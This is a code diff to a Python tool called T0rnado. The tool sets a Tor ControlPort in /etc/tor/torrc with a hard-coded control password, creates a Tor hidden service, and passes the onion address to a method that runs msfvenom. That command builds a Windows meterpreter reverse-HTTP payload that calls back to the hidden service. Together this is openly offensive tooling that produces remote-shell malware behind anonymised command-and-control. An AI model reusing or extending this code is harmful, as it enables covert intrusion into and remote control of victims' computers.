@@ -62,19 +62,51 @@ class T0rnado():
                 logger.errort('Metasploit is not downloaded.\nTry install Metasploit to your system with manually.')
         else:
             pass
+            
+    def configure(self):
+        password = 'allah'
+        logger.infot('ControlPort and HashedControlPassword is setting at /etc/tor/torrc file..')
+        try:
+            command = f"tor --hash-password {password}"
+            result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, universal_newlines=True)
+            hashed_password = result.stdout.split("\n")[1]
+            #os.system('sudo service tor stop')
+            '''try:
+                os.kill(int(subprocess.check_output(["pidof", "tor"])), signal.SIGTERM)
+            except:
+                pass'''
+            with open("/etc/tor/torrc", "r") as file:
+                lines = file.readlines()
+            with open("/etc/tor/torrc", "w") as file:
+                for line in lines:
+                    if "ControlPort" not in line and "HashedControlPassword" not in line:
+                        file.write(line)
+                # Yeni ControlPort ve HashedControlPassword satırlarını ekle
+                file.write(f"ControlPort 9051\nHashedControlPassword {hashed_password}\n")
+
+            #os.system('sudo service tor start')
+        except:
+            logger.errort('ControlPort is not set')
+            logger.errort('Try to add ControlPort 9051 to Tor configuration file at /etc/tor/torrc with command:')
+            logger.warnt("""sudo bash -c 'echo "ControlPort 9051" >> /etc/tor/torrc'""")
+            #os.system('sudo service tor stop')
+            os.kill(int(subprocess.check_output(["pidof", "tor"])), signal.SIGTERM)
+            sys.exit(1)
 
     def connection(self):
         logger.infot('Tor connection is starting..')
         with Controller.from_port(port=9051) as controller:
-            controller.authenticate()
+            controller.authenticate(password='allah')
             logger.infot(f'Tor is running version {controller.get_version()}')
             logger.infot('Creating hidden service in hidden_service folder..')
             hidden_service = os.path.join(controller.get_conf('DataDirectory', os.getcwd()), 'hidden_service')
             result = controller.create_hidden_service(path=hidden_service, port=80, target_port=1235)
-            if result.hostname:
+            if result and result.hostname:
                 logger.good(f'Service is available at {result.hostname}')
                 tor2web = result.hostname + ".to"
                 self.shell(tor2web)
+            else:
+                logger.error('Failed to create a hidden service. Please check Tor configuration and logs.')
 
     def shell(self, host):
         payload = "http"
@@ -96,21 +128,6 @@ class T0rnado():
         if arch == "x86":
             os.system(
                 f"/usr/bin/msfvenom -p windows/meterpreter_reverse_{payload} LHOST={host} LPORT=80 --platform windows -a x86 -f raw -o tornado.raw")
-
-    def configure(self):
-        logger.infot('ControlPort is setting at /etc/tor/torrc file..')
-        try:
-            os.system('sudo service tor stop')
-            os.kill(int(subprocess.check_output(["pidof", "tor"])), signal.SIGTERM)
-            os.system("sudo bash -c 'echo \"ControlPort 9051\" >> /etc/tor/torrc'")
-            logger.goodt('ControlPort is ready.')
-        except:
-            logger.errort('ControlPort is not set')
-            logger.errort('Try to add ControlPort 9051 to Tor configuration file at /etc/tor/torrc with command:')
-            logger.warnt("""sudo bash -c 'echo "ControlPort 9051" >> /etc/tor/torrc'""")
-            os.system('sudo service tor stop')
-            os.kill(int(subprocess.check_output(["pidof", "tor"])), signal.SIGTERM)
-            sys.exit(1)
 
     def process(self):
         self.startup()
